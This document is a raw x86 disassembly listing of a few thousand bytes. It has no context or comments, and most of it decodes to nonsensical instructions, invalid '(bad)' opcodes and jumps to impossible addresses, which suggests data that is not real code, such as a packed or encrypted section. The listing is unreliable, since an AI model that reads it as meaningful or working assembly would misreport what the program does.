  402162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402163:	pop    eax
  402164:	sti    
  402165:	out    0xe6,eax
  402167:	jmp    0xffff:0xad68ffec
  40216e:	in     eax,0x65
  402170:	fild   WORD PTR [ebx+0x7403ef04]
  402176:	sub    ecx,edx
  402178:	jbe    0x402186
  40217a:	mov    ebx,esp
  40217c:	xlat   BYTE PTR ds:[ebx]
  40217d:	add    BYTE PTR [ecx],dh
  40217f:	mov    BYTE PTR [ecx],0x2b
  402182:	jno    0x40217f
  402184:	in     al,dx
  402185:	jne    0x4021b4
  402187:	stos   BYTE PTR es:[edi],al
  402188:	jbe    0x402192
  40218a:	dec    ecx
  40218b:	ds in  al,dx
  40218d:	dec    DWORD PTR [esi-0x5c]
  402190:	ror    DWORD PTR [eax],0x31
  402193:	sbb    BYTE PTR [ecx-0x14],bh
  402196:	mov    dl,0x8
  402198:	adc    al,0xff
  40219a:	mov    esp,0x3d75ecdf
  40219f:	pop    edx
  4021a0:	jbe    0x4021aa
  4021a2:	sbb    DWORD PTR [edx-0x69e10014],ebp
  4021a8:	std    
  4021a9:	(bad)  
  4021aa:	pushf  
  4021ab:	fucomi st,st(4)
  4021ad:	jne    0x4021af
  4021af:	add    BYTE PTR ds:0x1908763a,bh
  4021b5:	jbe    0x4021a3
  4021b7:	(bad)  
  4021b8:	(bad)  
  4021b9:	xor    eax,ecx
  4021bb:	or     al,0x31
  4021bd:	js     0x402237
  4021bf:	in     al,dx
  4021c0:	out    dx,al
  4021c1:	lahf   
  4021c2:	sti    
  4021c3:	out    0xe6,eax
  4021c5:	and    ah,ch
  4021c7:	inc    DWORD PTR [ecx+0x4467fbd5]
  4021cd:	adc    al,0xd1
  4021cf:	inc    edx
  4021d0:	xor    ecx,ebx
  4021d2:	xchg   esp,eax
  4021d3:	sti    
  4021d4:	into   
  4021d5:	dec    esp
  4021d6:	push   ss
  4021d7:	in     al,dx
  4021d8:	mov    esi,0x3cece96d
  4021dd:	or     al,0x11
  4021df:	pop    ds
  4021e0:	scas   al,BYTE PTR es:[edi]
  4021e1:	fdivr  st,st(6)
  4021e3:	pop    eax
  4021e4:	xor    eax,DWORD PTR [edi-0x27110054]
  4021ea:	je     0x4021e7
  4021ec:	mov    fs,WORD PTR [esi+eiz*8]
  4021ef:	jmp    0x40217f
  4021f1:	ins    DWORD PTR es:[edi],dx
  4021f2:	jmp    0x40226c
  4021f4:	in     al,dx
  4021f5:	add    edi,DWORD PTR [ecx]
  4021f7:	jmp    0x4021fd
  4021f9:	or     al,0xc1
  4021fb:	and    DWORD PTR [esi-0x28],esi
  4021fe:	(bad)  
  4021ff:	dec    esp
  402200:	js     0x4021d7
  402202:	in     eax,dx
  402203:	add    edi,esp
  402205:	mov    ebp,es
  402207:	xchg   DWORD PTR [ebp-0x29],esi
  40220a:	scas   al,BYTE PTR es:[edi]
  40220b:	jno    0x402236
  40220d:	in     al,dx
  40220e:	jecxz  0x4021fd
  402210:	dec    esi
  402211:	fcom   st(2)
  402213:	inc    eax
  402214:	add    BYTE PTR [eax],al
  402216:	xor    eax,0xb2e82c8b
  40221b:	dec    esi
  40221c:	(bad)  
  40221e:	enter  0x8613,0x71
  402222:	cmp    eax,0xefbf4d7
  402227:	jmp    0xd85f0d9c
  40222c:	hlt    
  40222d:	out    0x16,eax
  40222f:	(bad)  
  402231:	fucomi st,st(2)
  402233:	(bad)  
  402234:	pop    esi
  402235:	jmp    0x40223d
  402237:	(bad)  
  402239:	(bad)  ds:0xaaeb4ed8
  40223f:	push   ecx
  402240:	inc    ebp
  402241:	mov    ebp,0x50e90cf3
  402246:	mov    edx,0xf16a00e8
  40224b:	loopne 0x402214
  40224d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40224e:	(bad)  
  40224f:	adc    al,0x0
  402251:	jmp    0x1d85ab88
  402256:	pop    ebp
  402257:	xlat   BYTE PTR ds:[ebx]
  402258:	jne    0x40223b
  40225a:	fiadd  DWORD PTR [eax-0x2c]
  40225d:	jmp    0x8200b394
  402262:	dec    ecx
  402263:	xlat   BYTE PTR ds:[ebx]
  402264:	jne    0x402257
  402266:	mov    dh,al
  402268:	stc    
  402269:	test   BYTE PTR [ebx-0x740eba73],0x61
  402270:	cld    
  402271:	sar    DWORD PTR [ecx],1
  402273:	ret    
  402274:	add    cl,ch
  402276:	xchg   DWORD PTR [edi+0xff74],edx
  40227c:	mov    esp,DWORD PTR [ecx-0x8]
  40227f:	cmp    edi,edx
  402281:	adc    ebp,eax
  402283:	cmp    BYTE PTR [eax],dh
  402285:	adc    al,0x0
  402287:	jo     0x40227a
  402289:	(bad)  
  40228b:	cmp    al,0x49
  40228d:	in     al,dx
  40228e:	or     DWORD PTR [edx+0x1cff1432],ebx
  402294:	dec    ebp
  402295:	out    dx,eax
  402296:	mov    ebx,0x8bd75ba2
  40229b:	sub    al,0x41
  40229d:	pop    es
  40229e:	enter  0x6296,0x44
  4022a2:	(bad)  
  4022a3:	cld    
  4022a4:	sub    ch,bh
  4022a6:	push   0x7f
  4022a8:	sbb    edx,edi
  4022aa:	leave  
  4022ab:	stos   DWORD PTR es:[edi],eax
  4022ac:	push   ds
  4022ad:	xlat   BYTE PTR ds:[ebx]
  4022ae:	push   esp
  4022af:	(bad)  
  4022b0:	(bad)  
  4022b1:	xchg   edx,eax
  4022b2:	les    ebx,FWORD PTR [ecx-0xd]
  4022b5:	push   eax
  4022b6:	hlt    
  4022b7:	jmp    0x644036ee
  4022bc:	jno    0x402296
  4022be:	push   eax
  4022bf:	dec    esi
  4022c0:	or     DWORD PTR [eax+ebp*8],0xbe8600
  4022c7:	add    BYTE PTR [ebp-0x2d],cl
  4022ca:	js     0x402319
  4022cc:	daa    
  4022cd:	fs or  al,ch
  4022d0:	xchg   bh,ah
  4022d2:	(bad)  
  4022d3:	inc    DWORD PTR [ecx+0x54]
  4022d6:	clc    
  4022d7:	and    DWORD PTR [ebp-0xb8dfb16],0xffffff8d
  4022de:	ins    DWORD PTR es:[edi],dx
  4022df:	clc    
  4022e0:	add    BYTE PTR [eax],al
  4022e2:	int3   
  4022e3:	jmp    0x7c811f5d
  4022e8:	rol    BYTE PTR [eax],cl
  4022ea:	cwde   
  4022eb:	aad    0xbf
  4022ed:	je     0x4022c9
  4022ef:	jmp    0x38f91b69
  4022f4:	add    al,ch
  4022f6:	cdq    
  4022f7:	aad    0xff
  4022f9:	call   DWORD PTR [edi+0x11d0f79a]
  4022ff:	pop    ss
  402300:	hlt    
  402301:	(bad)  
  402302:	fucomp st(3)
  402304:	call   0x4fed9e
  402309:	jmp    0x402389
  40230b:	jmp    0x402382
  40230d:	or     BYTE PTR [eax+0x16],dh
  402310:	sti    
  402311:	inc    DWORD PTR [edi-0x65364008]
  402317:	adc    eax,DWORD PTR [eax]
  402319:	jmp    0x402369
  40231b:	idiv   DWORD PTR [edi+0x138ac9]
  402321:	push   0x4a
  402323:	cmp    ah,bh
  402325:	jmp    FWORD PTR ds:0xb0f0e7da
  40232b:	jmp    0x40232c
  40232d:	(bad)  
  40232e:	dec    ebp
  40232f:	loopne 0x402332
  402331:	add    BYTE PTR [eax],cl
  402333:	adc    cl,BYTE PTR [ebp-0xbf97bb]
  402339:	jne    0x40233b
  40233b:	mov    edx,0x3e31fbd2
  402340:	jmp    0x47b97c8
  402345:	je     0x402347
  402347:	add    BYTE PTR [ebx-0x22],al
  40234a:	mov    ebx,0x6f1f6c3b
  40234f:	pop    es
  402350:	cdq    
  402351:	in     al,dx
  402352:	add    eax,DWORD PTR [eax]
  402354:	xor    DWORD PTR [edx+0x2],edx
  402357:	sub    esi,ecx
  402359:	add    al,BYTE PTR [esi]
  40235b:	sub    esi,ecx
  40235d:	and    al,0xc6
  40235f:	add    al,0x31
  402361:	cwde   
  402362:	jl     0x402350
  402364:	mov    dl,0x2f
  402366:	in     al,dx
  402367:	(bad)  
  402368:	hlt    
  402369:	push   cs
  40236a:	push   esp
  40236b:	call   FWORD PTR [ebx+eiz*8]
  40236e:	fisttp DWORD PTR [eax-0x7e]
  402371:	jmp    0x402376
  402373:	test   DWORD PTR [ecx+0x63],esi
  402376:	sbb    al,0xff
  402378:	add    al,0xe3
  40237a:	fcmovnu st,st(0)
  40237c:	mov    DWORD PTR [esi-0x3d0b7618],esi
  402382:	call   0x131398fc
  402387:	shl    BYTE PTR [ecx],cl
  402389:	jmp    0x402387
  40238b:	mov    edi,0x75e8bedd
  402390:	sub    eax,0x1f86e9e
  402395:	rcl    DWORD PTR [edi],cl
  402397:	or     esi,DWORD PTR [ecx]
  402399:	jmp    0x402383
  40239b:	jne    0x4023e2
  40239d:	sub    eax,0xffffffd1
  4023a0:	xor    ebx,ebp
  4023a2:	call   0xb2d34d1c
  4023a7:	cli    
  4023a8:	mov    ?,WORD PTR cs:[edx+0x390000c2]
  4023af:	jmp    0x4023ff
  4023b1:	mov    ecx,DWORD PTR ds:0x82e8bf6a
  4023b7:	ror    ah,cl
  4023b9:	lea    esi,[esp+edx*1+0x65]
  4023bd:	push   ebx
  4023be:	push   es
  4023bf:	pop    edi
  4023c0:	icebp  
  4023c1:	(bad)  
  4023c3:	shr    ecx,0x3
  4023c6:	lods   al,BYTE PTR ds:[esi]
  4023c7:	rcr    esi,cl
  4023c9:	jnp    0x402371
  4023cb:	adc    ebp,ecx
  4023cd:	add    esp,esi
  4023cf:	pop    esi
  4023d0:	icebp  
  4023d1:	(bad)  [ebp-0x5717c925]
  4023d7:	dec    esi
  4023d8:	xor    eax,0x11d844e8
  4023dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023de:	loopne 0x4023f3
  4023e0:	jmp    0x6d44a2e1
  4023e5:	xchg   DWORD PTR [ecx],esi
  4023e7:	adc    al,0xe9
  4023e9:	jp     0x4023df
  4023eb:	jecxz  0x4023f3
  4023ed:	outs   dx,BYTE PTR ds:[esi]
  4023ee:	popf   
  4023ef:	jmp    0x40241c
  4023f1:	fidiv  DWORD PTR [ecx]
  4023f3:	adc    al,0x6a
  4023f5:	mov    edi,0x3e90f2d
  4023fa:	loope  0x40240f
  4023fc:	cmp    esp,ebx
  4023fe:	fcom   DWORD PTR [ebx]
  402400:	jmp    0xc58ecc08
  402405:	out    0xfc,eax
  402407:	ffreep st(1)
  402409:	xchg   edi,eax
  40240a:	pop    eax
  40240b:	adc    ebp,ecx
  40240d:	sub    BYTE PTR [ebp+0xf],0xe4
  402411:	add    eax,DWORD PTR [eax]
  402413:	add    BYTE PTR [ecx],dh
  402415:	add    al,0xe9
  402417:	push   ebx
  402418:	dec    ecx
  402419:	sub    ecx,0x3
  40241c:	xor    DWORD PTR [ebx+0x13dbdc2c],ecx
  402422:	sahf   
  402423:	jno    0x402472
  402425:	aam    0x1c
  402427:	lock ss pop esi
  40242a:	and    edi,0x8d91c4a4
  402430:	sbb    BYTE PTR ds:0x28f582e9,dl
  402436:	add    BYTE PTR [eax+0x70],ah
  402439:	int3   
  40243a:	push   esp
  40243c:	push   ss
  40243d:	mov    ebp,0x142d3865
  402442:	call   esp
  402444:	cli    
  402445:	mov    ebx,0xd40e5390
  40244a:	push   0xffffffe1
  40244c:	mov    ah,BYTE PTR [ebx+0x28]
  40244f:	test   al,0x32
  402451:	shl    DWORD PTR [ebp-0xf],cl
  402454:	cli    
  402455:	lock cld 
  402457:	ss into 
  402459:	pop    ds
  40245a:	fsubr  DWORD PTR [esi]
  40245c:	inc    eax
  40245d:	enter  0x9cff,0xca
  402461:	mov    ebx,0xd3d61dba
  402466:	and    esi,DWORD PTR [ecx]
  402468:	into   
  402469:	dec    ecx
  40246a:	clc    
  40246b:	push   cs
  40246c:	and    BYTE PTR [edi+edi*8-0x1f445584],bh
  402473:	std    
  402474:	xchg   edi,eax
  402475:	shl    DWORD PTR [ebx],cl
  402477:	adc    DWORD PTR [eax],eax
  402479:	add    BYTE PTR [esi+0x3e01ec49],cl
  40247f:	adc    al,0x0
  402481:	jmp    0xd2286e15
  402486:	xchg   ebx,edx
  402488:	(bad)  
  402489:	jmp    0xc1486e1d
  40248e:	test   ebp,ecx
  402490:	inc    esi
  402492:	jmp    0x40246a
  402494:	pop    ebx
  402495:	mov    al,0x70
  402497:	sbb    BYTE PTR [eax],al
  402499:	sbb    al,0xda
  40249b:	mov    edi,0xd34d2c83
  4024a0:	jae    0x402493
  4024a2:	dec    edi
  4024a3:	dec    ecx
  4024a4:	or     BYTE PTR [ecx-0x16ff1acf],dl
  4024aa:	sbb    edx,esp
  4024ac:	leave  
  4024ad:	stos   DWORD PTR es:[edi],eax
  4024ae:	rcl    DWORD PTR cs:[eax+eax*1-0x5d],cl
  4024b3:	jmp    0x402440
  4024b5:	inc    ebp
  4024b6:	and    BYTE PTR [eax+eax*4],dl
  4024b9:	add    BYTE PTR [eax],cl
  4024bb:	pop    ss
  4024bc:	push   eax
  4024bd:	push   0x58
  4024bf:	lock repnz rcr BYTE PTR [eax],1
  4024c3:	pop    ss
  4024c4:	leave  
  4024c5:	ret    0x1714
  4024c8:	push   ebp
  4024c9:	mov    ebp,DWORD PTR [edx+eiz*2-0x4]
  4024cd:	mov    edi,ebp
  4024cf:	into   
  4024d0:	mov    cl,BYTE PTR [ebp-0x24]
  4024d3:	mov    ch,0xe
  4024d5:	push   ecx
  4024d6:	or     eax,esi
  4024d8:	add    ch,BYTE PTR [ebx]
  4024da:	or     dh,al
  4024dc:	stos   DWORD PTR es:[edi],eax
  4024dd:	pop    ecx
  4024de:	add    BYTE PTR [eax],al
  4024e0:	pop    ebx
  4024e1:	mov    eax,0x5a62f303
  4024e6:	leave  
  4024e7:	ret    0x16c0
  4024ea:	push   ebp
  4024eb:	mov    ebp,DWORD PTR [ecx+eiz*2]
  4024ee:	push   edi
  4024ef:	mov    edi,DWORD PTR [ebp+0x258bfbca]
  4024f5:	iret   
  4024f6:	mov    cl,BYTE PTR [ebp+0x78]
  4024f9:	mov    ch,0x2
  4024fb:	repz in al,0x59
  4024fe:	pop    esi
  4024ff:	leave  
  402500:	pop    edx
  402501:	retf   
  402502:	call   DWORD PTR [ebx+eax*1-0x14]
  402506:	push   esi
  402507:	push   edi
  402508:	add    eax,DWORD PTR [ebx+0x8]
  40250b:	cld    
  40250c:	adc    ecx,DWORD PTR [ebx]
  40250e:	adc    BYTE PTR [ebx],ch
  402510:	cwde   
  402511:	dec    esp
  402512:	jge    0x402520
  402514:	jnp    0x40252b
  402516:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402518:	arpl   WORD PTR [ebp+0x59080175],cx
  40251e:	pop    esi
  40251f:	leave  
  402520:	call   0x83eb:0xc354ffcb
  402527:	les    ebx,FWORD PTR [ecx+eiz*2+0x15315357]
  40252e:	add    al,BYTE PTR [ecx]
  402530:	xor    DWORD PTR [ebx-0x5cc68a1c],edi
  402536:	xchg   ebx,eax
  402537:	call   FWORD PTR [esi]
  402539:	push   ebx
  40253a:	jns    0x4025b9
  40253c:	sub    DWORD PTR [edx],eax
  40253e:	cmp    eax,0x404e32b
  402543:	add    DWORD PTR [eax],eax
  402545:	add    BYTE PTR [ecx],dh
  402547:	mov    ebx,0x713b147b
  40254c:	ret    0xf8e2
  40254f:	or     BYTE PTR ss:[bp+0x7a],dh
  402554:	js     0x4025cb
  402556:	xor    eax,0x31fe3f01
  40255b:	es mov ebx,0x35fa2b
  402561:	cmp    edi,DWORD PTR [ecx+0x6c00e478]
  402567:	stc    
  402568:	jns    0x40256e
  40256a:	add    BYTE PTR [ebx+0x7126fe3e],bh
  402570:	dec    edi
  402571:	(bad)  
  402572:	mov    ebx,0x2d8829b7
  402577:	(bad)  
  402578:	jns    0x4025bf
  40257a:	sahf   
  40257b:	inc    ebx
  40257c:	add    BYTE PTR [edx],bh
  40257e:	lock test DWORD PTR [esi],esi
  402581:	adc    BYTE PTR [ebx],al
  402583:	mov    ebp,0x7e87c918
  402588:	outs   dx,BYTE PTR ds:[esi]
  402589:	aad    0xda
  40258b:	adc    DWORD PTR [esi-0x37],eax
  40258e:	jae    0x402547
  402590:	add    edx,DWORD PTR [ebp-0x46]
  402593:	pop    DWORD PTR [eax+0x4e2e69c4]
  402599:	push   edi
  40259a:	pop    esi
  40259b:	or     ah,bh
  40259d:	pop    edx
  40259e:	stos   DWORD PTR es:[edi],eax
  40259f:	mov    esi,0x354c457b
  4025a4:	inc    eax
  4025a5:	add    DWORD PTR [ecx+0xe82c14],edi
  4025ab:	add    BYTE PTR [edx-0x55c2d933],ch
  4025b1:	inc    edi
  4025b2:	in     eax,0xbc
  4025b4:	je     0x402582
  4025b6:	jmp    0x725456be
  4025bb:	ss inc ecx
  4025bd:	mov    ch,0x29
  4025bf:	out    0x6c,al
  4025c1:	iret   
  4025c2:	out    0xad,al
  4025c4:	je     0x402595
  4025c6:	fisubr WORD PTR [ebp+0x4e710c1d]
  4025cc:	(bad)  
  4025cd:	adc    esi,DWORD PTR [edi+eiz*8-0x185375da]
  4025d4:	mov    ebx,0x7c7c1127
  4025d9:	shl    dh,cl
  4025db:	lods   eax,DWORD PTR ds:[esi]
  4025dc:	je     0x4025ad
  4025de:	jno    0x4025ef
  4025e0:	sbb    DWORD PTR [ecx],esp
  4025e2:	jg     0x402622
  4025e4:	int    0x9d
  4025e6:	xchg   esp,eax
  4025e7:	in     al,0xb9
  4025e9:	daa    
  4025ea:	loope  0x402665
  4025ec:	fs shr ebx,1
  4025ef:	dec    esi
  4025f0:	mov    bh,0x9d
  4025f2:	std    
  4025f3:	sub    DWORD PTR [edx+0x3d331156],edi
  4025f9:	add    al,0x6
  4025fb:	ds cdq 
  4025fd:	mov    ch,0x29
  4025ff:	jns    0x4025ed
  402601:	into   
  402602:	popa   
  402603:	add    BYTE PTR [ebx-0xd8512aa],bh
  402609:	adc    al,BYTE PTR [esi+0x42]
  40260c:	fcmovu st,st(2)
  40260e:	stos   DWORD PTR es:[edi],eax
  40260f:	adc    BYTE PTR [eax],al
  402611:	add    BYTE PTR [ecx],dh
  402613:	addr16 (bad) 
  402615:	lock mov al,0xd7
  402618:	mov    ebp,0x1ad066e2
  40261d:	das    
  40261e:	jp     0x4025be
  402620:	and    al,0xe0
  402622:	add    ecx,edx
  402624:	add    BYTE PTR [edi*1+0x2d99a3bc],bh
  40262b:	adc    al,0x85
  40262d:	test   eax,0xe9969c22
  402632:	xor    dl,BYTE PTR [edi+edi*8]
  402635:	sbb    al,0x3d
  402637:	mov    esp,0xd012972f
  40263c:	mov    DWORD PTR [ecx+edi*8],ebp
  40263f:	iret   
  402640:	jne    0x4026bf
  402642:	add    eax,0x32e9cf3d
  402647:	sbb    eax,eax
  402649:	cmc    
  40264a:	xchg   ebx,eax
  40264b:	popf   
  40264c:	inc    ebp
  40264d:	pop    ecx
  40264e:	adc    cl,BYTE PTR [edx-0xc]
  402651:	push   ecx
  402652:	mov    ecx,esi
  402654:	call   DWORD PTR [esi-0x44]
  402657:	pop    ecx
  402658:	clc    
  402659:	dec    esi
  40265a:	mov    al,cl
  40265c:	(bad)  
  40265d:	mov    esp,0x3975cffa
  402662:	lds    esp,FWORD PTR [eax-0x302dc902]
  402668:	jne    0x402697
  40266a:	aad    0x56
  40266c:	iret   
  40266d:	jmp    0xedb5f5a4
  402672:	retf   0xcf02
  402675:	jmp    0x6472267a
  40267a:	call   DWORD PTR [esi+esi*1-0x6ce87a5f]
  402681:	iret   
  402682:	call   FWORD PTR [ecx-0x9018676]
  402688:	xchg   ebx,eax
  402689:	iret   
  40268a:	jne    0x402681
  40268c:	xchg   ebx,eax
  40268d:	dec    ecx
  40268e:	clc    
  40268f:	je     0x40263a
  402691:	mov    esi,0x6493defe
  402696:	call   0xf7772
  40269b:	into   
  40269c:	or     DWORD PTR [eax+ebp*8],ebx
  40269f:	add    BYTE PTR [edi],cl
  4026a1:	lock (bad) 
  4026a3:	inc    DWORD PTR [edx]
  4026a5:	and    BYTE PTR [eax+0x5a],ch
  4026a8:	xor    BYTE PTR [ecx+0x0],bl
  4026ab:	(bad)  
  4026ac:	std    
  4026ad:	pop    ds
  4026ae:	call   0xfff2b946
  4026b3:	or     esi,DWORD PTR [eax-0x4e]
  4026b6:	jne    0x4026ac
  4026b8:	(bad)  
  4026b9:	imul   edi,eax,0xffffffff
  4026bc:	cmp    eax,0xb283e820
  4026c1:	mov    cl,0xff
  4026c3:	and    edx,eax
  4026c5:	mov    cl,0x75
  4026c7:	clc    
  4026c8:	mov    al,0x8d
  4026ca:	std    
  4026cb:	call   DWORD PTR [edi+0x600875b2]
  4026d1:	xchg   esp,eax
  4026d2:	idiv   edi
  4026d4:	push   edi
  4026d5:	sahf   
  4026d6:	ret    
  4026d7:	pop    ebx
  4026d8:	adc    ecx,ebx
  4026da:	or     BYTE PTR [eax],al
  4026dc:	add    BYTE PTR [eax],al
  4026de:	popf   
  4026df:	popf   
  4026e0:	in     al,dx
  4026e1:	or     DWORD PTR [edi+eiz*8],0x57
  4026e5:	mov    ecx,DWORD PTR [ebp-0x733ff53a]
  4026eb:	sbb    al,0xc7
  4026ed:	add    al,bl
  4026ef:	adc    al,BYTE PTR [eax]
  4026f1:	add    bl,ah
  4026f3:	mov    cl,0x83
  4026f5:	jge    0x402727
  4026f7:	sbb    DWORD PTR [ebp+0x7],esi
  4026fa:	add    dl,BYTE PTR [ebx]
  4026fc:	add    al,BYTE PTR [eax]
  4026fe:	cwde   
  4026ff:	mov    ebp,0xcab5830f
  402704:	add    DWORD PTR [ebp-0x71],esi
  402707:	mov    al,0x0
  402709:	add    DWORD PTR [eax+0x7302eb12],ebx
  40270f:	mov    BYTE PTR [ecx+0x21831ca],al
  402715:	add    BYTE PTR ds:0x3150fc57,al
  40271b:	or     ebp,DWORD PTR [esi+0x0]
  40271e:	data16 addr16 adc bh,bh
  402722:	in     al,0xc4
  402724:	jmp    0x4026f6
  402726:	mov    sp,0xb03
  40272a:	jno    0x40273b
  40272c:	jno    0x4026bb
  40272e:	in     al,dx
  40272f:	test   BYTE PTR [edx+ebp*2],dh
  402732:	xor    DWORD PTR [eax+0x47],ecx
  402735:	hlt    
  402736:	loope  0x40275a
  402738:	add    al,0xff
  40273a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40273b:	retf   
  40273c:	loopne 0x4027b3
  40273e:	and    eax,0xcf9d94
  402743:	add    BYTE PTR [ecx],dh
  402745:	mov    ebx,0xff9cc00c
  40274a:	test   BYTE PTR [ebp+0x9],bh
  40274d:	mov    esp,0xc0b24657
  402752:	xlat   BYTE PTR ds:[ebx]
  402753:	add    DWORD PTR [ebp+edi*4-0x4306827c],eax
  40275a:	push   edi
  40275b:	cmp    bh,BYTE PTR [edx-0x7ebf2480]
  402761:	push   ebx
  402762:	inc    edx
  402763:	std    
  402764:	ficom  WORD PTR [esi-0x73]
  402767:	clc    
  402768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402769:	js     0x402746
  40276b:	push   eax
  40276c:	rol    WORD PTR [ebx],1
  40276f:	push   0x31
  402771:	(bad)  
  402772:	push   esi
  402773:	adc    BYTE PTR [esi-0x53172050],bh
  402779:	inc    BYTE PTR [ebx]
  40277b:	add    BYTE PTR [edx],bh
  40277d:	sti    
  40277e:	push   edi
  40277f:	or     bh,dh
  402781:	adc    ch,BYTE PTR [ecx]
  402783:	std    
  402784:	sahf   
  402785:	push   ss
  402786:	sub    eax,0x8cbf8aff
  40278b:	inc    ebp
  40278c:	and    eax,0x2c74c3b2
  402791:	mov    esi,0x14aef856
  402796:	jmp    0xd210247b
  40279b:	push   0x7e
  40279d:	adc    al,0xe9
  40279f:	mov    WORD PTR [esi+0x19],gs
  4027a2:	test   eax,0x44913d56
  4027a7:	cld    
  4027a8:	add    BYTE PTR [eax],al
  4027aa:	xor    BYTE PTR [ecx-0x29],al
  4027ad:	mov    esp,?
  4027af:	sub    ebp,DWORD PTR [ecx]
  4027b1:	xor    al,0x46
  4027b3:	inc    edi
  4027b4:	aad    0xe0
  4027b6:	les    esp,FWORD PTR [ebx]
  4027b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027b9:	push   esi
  4027ba:	and    eax,0x190c14cd
  4027bf:	repz xchg ebp,eax
  4027c1:	loopne 0x4027e9
  4027c3:	ins    DWORD PTR es:[edi],dx
  4027c4:	mov    al,ds:0x1c1445c5
  4027c9:	lea    eax,ds:0x300bfc93
  4027cf:	adc    al,0xe9
  4027d1:	cmp    DWORD PTR [ebx+ebx*1+0x6e],0x16
  4027d6:	pop    ebp
  4027d7:	sti    
  4027d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027d9:	add    esp,DWORD PTR [esi+0x316df156]
  4027df:	int    0xdc
  4027e1:	mul    edi
  4027e3:	inc    esi
  4027e4:	stc    
  4027e5:	loopne 0x40284b
  4027e7:	and    BYTE PTR [esi+0x56],al
  4027ea:	sub    DWORD PTR [ebp+esi*1+0x20cccee1],edi
  4027f1:	lds    esp,FWORD PTR [ecx]
  4027f3:	adc    al,0x2
  4027f5:	les    ebp,FWORD PTR [edx+0x78e538e3]
  4027fb:	sbb    ch,cl
  4027fd:	add    esi,DWORD PTR [ecx]
  4027ff:	jecxz  0x402804
  402801:	push   esp
  402802:	xor    eax,0xc3121b93
  402807:	jp     0x40280e
  402809:	and    BYTE PTR [ebx+0xf2d822],0x0
  402810:	and    DWORD PTR [edx+0x27bb0700],esi
  402816:	test   DWORD PTR [ecx-0x18ffaced],ecx
  40281c:	ins    DWORD PTR es:[edi],dx
  40281d:	inc    esi
  40281e:	fisubr DWORD PTR [edx+0x3eec9928]
  402824:	mov    edx,0xa5d60856
  402829:	cwde   
  40282a:	jge    0x402821
  40282c:	stos   DWORD PTR es:[edi],eax
  40282d:	pop    esi
  40282e:	adc    dl,dh
  402830:	jge    0x402879
  402832:	sbb    BYTE PTR [edx+0x7d],ah
  402835:	shr    dl,cl
  402837:	loope  0x402859
  402839:	adc    eax,0x142da625
  40283e:	add    BYTE PTR [edx+0x39],dh
  402841:	xchg   ecx,eax
  402842:	pusha  
  402843:	or     BYTE PTR [esp+edx*1+0x33],ch
  402847:	stos   DWORD PTR es:[edi],eax
  402848:	jbe    0x402800
  40284a:	call   0xc9ac05cd
  40284f:	stos   DWORD PTR es:[edi],eax
  402850:	and    DWORD PTR [edx*2-0x7c97fe9e],edx
  402857:	in     al,dx
  402858:	sub    dl,BYTE PTR [esi*2+0x851efee]
  40285f:	cs sbb eax,0x506a0055
  402865:	sbb    BYTE PTR [eax],al
  402867:	aam    0x37
  402869:	rol    DWORD PTR [ebp-0xb],cl
  40286c:	out    0xfc,eax
  40286e:	inc    eax
  40286f:	jmp    0x41486a63
  402874:	add    BYTE PTR [eax],al
  402876:	fld    DWORD PTR es:[eax]
  402879:	jmp    0x9d401529
  40287e:	es mov esp,0x14352c35
  402884:	add    esi,DWORD PTR [ecx]
  402886:	bnd callw 0xa759
  40288b:	retf   
  40288c:	inc    DWORD PTR [eax]
  40288e:	and    ecx,DWORD PTR [eax+0x68075ff]
  402894:	call   0x5075d8
  402899:	inc    DWORD PTR ds:0x4ce8531b
  40289f:	in     eax,0x0
  4028a1:	add    bl,ah
  4028a3:	aad    0x5b
  4028a5:	leave  
  4028a6:	call   0x53ba:0xd355001f
  4028ad:	sub    ebp,0x17
  4028b0:	add    BYTE PTR [ebp+0x57],dh
  4028b3:	rol    BYTE PTR [ebp+0x8],cl
  4028b6:	(bad)  
  4028b7:	inc    DWORD PTR [eax+0x0]
  4028ba:	retf   
  4028bb:	xor    ecx,DWORD PTR [eax+eax*1]
  4028be:	adc    eax,0x1c45c713
  4028c3:	fisubr DWORD PTR [eax]
  4028c5:	inc    ecx
  4028c6:	sbb    dl,ch
  4028c8:	jne    0x4028d2
  4028ca:	mov    al,0xbd
  4028cc:	int3   
  4028cd:	add    BYTE PTR [eax],cl
  4028cf:	sahf   
  4028d0:	fdivr  st,st(7)
  4028d2:	add    eax,0xcce1e81b
  4028d7:	push   ss
  4028d8:	add    BYTE PTR [ebx],al
  4028da:	add    BYTE PTR [eax],al
  4028dc:	mov    al,ds:0x63e85355
  4028e1:	out    dx,al
  4028e2:	(bad)  
  4028e3:	jmp    DWORD PTR [ebx-0x71]
  4028e6:	push   DWORD PTR [ebp-0x30]
  4028e9:	add    eax,0x173cebe8
  4028ee:	add    bh,bh
  4028f0:	xchg   ebp,eax
  4028f1:	sbb    dl,BYTE PTR [ebx-0x18]
  4028f4:	pusha  
  4028f5:	fild   DWORD PTR [eax]
  4028f7:	add    bh,bh
  4028f9:	imul   ecx,DWORD PTR [eax],0xffffffe8
  4028fc:	inc    eax
  4028fd:	out    dx,al
  4028fe:	(bad)  
  4028ff:	inc    DWORD PTR [ebx-0x2a]
  402902:	pop    ebx
  402903:	leave  
  402904:	pop    edx
  402905:	pop    ds
  402906:	add    BYTE PTR [ebp+0x31],dl
  402909:	ss out dx,eax
  40290b:	xor    DWORD PTR [ebp+0x18],0x36
  40290f:	push   0x3bc2c
  402914:	cdq    
  402915:	add    edx,ebx
  402917:	inc    DWORD PTR [esi-0x4d03b7cd]
  40291d:	ja     0x40297c
  40291f:	sub    eax,esi
  402921:	mov    esp,0xe6337503
  402926:	idiv   dh
  402928:	fsubr  st(0),st
  40292a:	push   0x0
  40292c:	retf   
  40292d:	mov    esp,0x672975dc
  402932:	add    al,0xff
  402934:	and    al,0xb
  402936:	sub    eax,DWORD PTR [ecx+0x31]
  402939:	cmp    ah,al
  40293b:	jns    0x402926
  40293d:	jns    0x402996
  40293f:	cld    
  402940:	add    BYTE PTR [eax],al
  402942:	dec    ecx
  402943:	sub    cl,bl
  402945:	jmp    FWORD PTR [esi]
  402947:	jae    0x402990
  402949:	cld    
